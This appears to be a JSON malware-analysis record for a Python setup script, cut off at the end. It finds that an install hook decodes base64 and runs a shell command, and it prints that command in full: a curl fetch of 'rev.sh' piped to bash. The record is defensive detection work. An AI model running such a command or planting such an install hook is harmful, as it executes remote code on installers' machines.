{
  "purpose": "To define a Python package setup configuration that, upon installation or development setup, executes a potentially malicious code segment that makes an HTTP request to a specified URL.",
  "sources": "The function 'notmalfunc' which calls 'os.system' with decoded base64 command, triggered during the 'install' process via 'AfterInstall' class.",
  "sinks": "The 'os.system' call executing decoded code, which runs a shell command to perform an HTTP request.",
  "flows": "The setup script calls 'AfterInstall.run()', which in turn calls 'notmalfunc()', leading to 'os.system' executing the decoded string: 'curl -s http://localhost:8000/rev.sh | bash', possibly fetching and executing remote malicious code.",
  "anomalies": "Use of base64 decoding to obfuscate the command executed during installation, execution of system commands during setup, and the presence of a decoded URL pointing to 'localhost:8000' which is suspicious and suggests a backdoor or remote control server.",
  "analysis": "The code imports necessary setup tools and defines a function 'b64d' to decode base64 strings. It defines 'notmalfunc' which executes a shell command decoded from base64 that performs a curl request to a localhost address, piping the output to bash. Custom classes 'AfterDevelop' and 'AfterInstall' are created to hook into the setup process, with 'notmalfunc' called during installation. The setup configuration includes standard package metadata, but the critical point is the call to 'notmalfunc' during install, which executes potentially malicious remote code fetched via curl. The use of base64 decoding and execution of system commands during setup strongly indicates malicious intent or sabotage, especially considering the target URL is localhost, which may indicate a backdoor or remote command execution channel.",
  "conclusion": "The setup script contains malicious behavior by executing a decoded shell command during package installation, likely to download and run remote malicious code. The obfuscation techniques and execution during install indicate a high likelihood of malicious intent.",
